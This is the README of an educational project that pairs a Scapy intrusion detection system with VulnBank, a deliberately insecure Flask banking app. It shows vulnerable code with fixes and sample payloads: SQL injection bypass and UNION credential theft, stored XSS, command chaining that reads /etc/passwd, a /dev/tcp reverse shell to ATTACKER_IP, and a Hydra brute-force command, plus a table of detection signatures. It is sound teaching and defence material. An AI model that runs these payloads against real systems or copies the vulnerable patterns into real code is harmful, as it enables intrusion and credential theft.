## Network Intrusion Detection System (NIDS)

A Python-based Network Intrusion Detection System using Scapy for real-time packet capture and signature/behavioral analysis, paired with a vulnerable Flask banking application (VulnBank) for controlled testing. The purpose of this application is for beginners to gain hands on experience for common cyber security vunerabilities and attacks.

## Vulnerable Application — VulnBank

VulnBank is a deliberately insecure Flask banking application with four vulnerability categories mapped to the OWASP Top 10. Each vulnerability exists because of a specific, identifiable coding mistake.

### Vulnerability 1: SQL Injection (OWASP A03:2021 — Injection)

**Affected routes:** `/login`, `/accounts`

**Root cause:** User input is concatenated directly into SQL query strings instead of using parameterized queries.

**Vulnerable code:**
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
user = db.execute(query).fetchone()
```

**How it works:** The application builds SQL queries by inserting user-supplied values into a string template. Because the values are not escaped or parameterized, an attacker can inject arbitrary SQL syntax that alters the query's logic.

**Exploitation — Authentication bypass:**
```
Username: ' OR '1'='1' --
Password: anything
```
The resulting query becomes:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything'
```
The `OR '1'='1'` condition is always true, returning every row in the users table. The `--` comments out the password check entirely. The application logs in as the first user returned (typically the admin).

**Exploitation — Data exfiltration via UNION attack:**
```
Search: ' UNION SELECT 1,username,password,role,1 FROM users --
```
This appends a second query that pulls credentials from the users table and displays them in the account search results. The column count in the UNION must match the original query.

**Secure implementation:**
```python
query = "SELECT * FROM users WHERE username = ? AND password = ?"
user = db.execute(query, (username, password)).fetchone()
```
Parameterized queries treat user input as data, never as executable SQL.

---

### Vulnerability 2: Cross-Site Scripting / XSS (OWASP A03:2021 — Injection)

**Affected route:** `/support`

**Root cause:** User-submitted content is stored in the database and rendered as raw HTML without sanitization or output encoding.

**Vulnerable code:**
```python
# Stored without sanitization
db.execute("INSERT INTO tickets (author, content) VALUES (?, ?)", (author, content_text))

# Rendered without escaping — Markup() disables Jinja2's auto-escaping
unsafe_tickets.append({
    'content': Markup(t['content']),
})
```

**How it works:** When a user submits a support ticket containing HTML or JavaScript, that content is saved to the database as-is. When any user views the support page, the malicious content is rendered directly into the DOM and executed by the browser.

**Exploitation — Stored XSS:**
```html
<script>alert('XSS')</script>
```
Submitted as a support ticket message, this JavaScript executes in the browser of every user who loads the support page.

**Real-world impact:** An attacker would replace the alert with a payload that exfiltrates session cookies (`document.cookie`), redirects users to phishing pages, injects fake login forms to harvest credentials, or modifies page content (e.g., changing displayed account balances).

**Secure implementation:**
```python
# Let Jinja2's auto-escaping handle output encoding — do not use Markup()
# In the template, {{ t['content'] }} is automatically escaped
```
Jinja2 escapes `<script>` to `&lt;script&gt;` by default, rendering it as visible text instead of executable code.

---

### Vulnerability 3: Command Injection (OWASP A03:2021 — Injection)

**Affected route:** `/diagnostics`

**Root cause:** User input is passed directly into a shell command via `subprocess.run()` with `shell=True`.

**Vulnerable code:**
```python
cmd = f"ping -c 2 {target}"
result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
```

**How it works:** The `shell=True` parameter passes the command string to the system shell (`/bin/sh` on Linux, `cmd.exe` on Windows) for interpretation. Shell metacharacters like `;`, `|`, `&&`, and backticks have special meaning — they allow command chaining. Because the user input is embedded in the string without validation, an attacker can terminate the intended command and append arbitrary system commands.

**Exploitation — Command chaining:**
```
Target: 127.0.0.1; cat /etc/passwd
```
The shell interprets this as two separate commands: `ping -c 2 127.0.0.1` followed by `cat /etc/passwd`. The output of both commands is returned to the browser.

**Exploitation — Reverse shell:**
```
Target: 127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```
This establishes an interactive shell session back to the attacker's machine, providing full system access.

**Secure implementation:**
```python
import re
if re.match(r'^[\w.\-]+$', target):
    result = subprocess.run(["ping", "-c", "2", target], capture_output=True, text=True)
```
Input validation restricts the target to alphanumeric characters, dots, and hyphens. The list-based `subprocess.run` without `shell=True` prevents the shell from interpreting metacharacters.

---

### Vulnerability 4: Brute Force (OWASP A07:2021 — Identification and Authentication Failures)

**Affected route:** `/login`

**Root cause:** No rate limiting, account lockout, CAPTCHA, or multi-factor authentication on the login endpoint.

**How it works:** The login form accepts unlimited authentication attempts at any speed. An attacker can systematically try thousands of credential combinations using automated tools.

**Exploitation with Hydra (Kali Linux):**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 5000 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```
This runs through the rockyou wordlist (14 million common passwords) against the admin account. With no rate limiting, Hydra can attempt hundreds of passwords per minute.

**Additional weaknesses:** Passwords are stored in plaintext in the database. The error message ("Invalid credentials") does not distinguish between invalid usernames and invalid passwords, but the lack of rate limiting makes this a moot point — the attacker can brute force both.

**Secure implementation:** Rate limiting (e.g., 5 attempts per minute per IP), progressive delays between attempts, account lockout after repeated failures, CAPTCHA challenges, multi-factor authentication, and password hashing with bcrypt or argon2.

---

## Intrusion Detection System

The NIDS implements two detection methodologies that mirror those used in production systems like Snort and Suricata.

### Signature-Based Detection

Pattern matching against known attack signatures using regular expressions. Each incoming HTTP payload is compared against curated pattern lists defined in `signatures.py`.

| Category | Severity | Example Pattern | Detects |
|---|---|---|---|
| SQL Injection | CRITICAL | `union.*select` | UNION-based data exfiltration |
| SQL Injection | CRITICAL | `or\s+1\s*=\s*1` | Always-true authentication bypass |
| XSS | HIGH | `<script[^>]*>` | Script tag injection |
| XSS | HIGH | `on\w+\s*=` | Event handler injection (onclick, onerror) |
| Command Injection | CRITICAL | `/etc/(passwd\|shadow)` | Sensitive file access |
| Command Injection | CRITICAL | `;\s*\w` | Command chaining via semicolon |
| Directory Traversal | HIGH | `\.\./` | Path traversal sequences |
| User-Agent | MEDIUM | `sqlmap`, `nikto`, `nmap` | Known offensive tool identification |

### Behavioral Detection

Anomaly detection based on traffic patterns over sliding time windows. State is maintained per source IP using in-memory dictionaries.

**Brute Force Detection:** Tracks POST requests to `/login` per source IP. If the count exceeds the configured threshold (default: 5) within the time window (default: 60 seconds), an alert fires. The sliding window continuously discards entries older than the threshold, ensuring detection adapts to real-time conditions.

**Request Flood Detection:** Counts all requests per source IP within a shorter window (default: 10 seconds, threshold: 50). Catches automated scanning tools (Nikto, Gobuster) and denial-of-service attempts that generate high request volumes.

**SYN Scan Detection:** Monitors TCP SYN packets (flag `0x02`) and tracks unique destination ports per source IP. Normal traffic touches 1–3 ports. A port scanner like Nmap probes hundreds of ports in seconds. When unique port count exceeds the threshold (default: 15) within 10 seconds, the pattern is identified as reconnaissance.

---

## Setup

### Prerequisites

- Python 3.8+
- Npcap (Windows) — download from [npcap.com](https://npcap.com) and install with "WinPcap API-compatible Mode" enabled
- libpcap (Linux/macOS) — typically pre-installed

### Installation

```bash
git clone https://github.com/YOUR_USERNAME/intrusion-detection-system.git
cd intrusion-detection-system
python -m venv venv

# Activate virtual environment
# Windows:
venv\Scripts\activate
# Linux/macOS:
source venv/bin/activate

pip install -r requirements.txt
mkdir logs
```

### Running the Application

**Terminal 1 — Start the vulnerable web application:**
```bash
python app.py
```
Access VulnBank at `http://127.0.0.1:5000`

Default credentials:
| Username | Password | Role |
|---|---|---|
| admin | admin123 | admin |
| jsmith | password1 | customer |
| mjones | letmein | customer |
| teller1 | teller2024 | teller |

**Terminal 2 — Start the IDS (requires elevated privileges):**
```bash
# Windows (run terminal as Administrator):
python ids.py -i "\\Device\\NPF_Loopback"

# Linux:
sudo python ids.py -i lo

# macOS:
sudo python ids.py -i lo0
```

### IDS Command Line Options

```
-i, --interface    Network interface to monitor (default: lo)
-p, --port         Port to monitor (default: 5000)
-l, --log          Alert log file path (default: logs/ids_alerts.log)
-q, --quiet        Suppress console output, log only
```
---

## Future Enhancements

- Machine learning-based anomaly detection using scikit-learn for identifying novel attack patterns
- Web dashboard for real-time alert visualization and historical analysis
- HTTPS interception via mitmproxy integration
- Integration with threat intelligence feeds for dynamic signature updates
- Multi-threaded packet processing with queue-based architecture
- Alerting integrations (email, Slack, webhook notifications)

---

## Disclaimer

This project is built exclusively for educational purposes and authorized security testing. The vulnerable application contains intentional security flaws and must never be deployed on a public network. Always obtain proper authorization before performing security testing on any system.
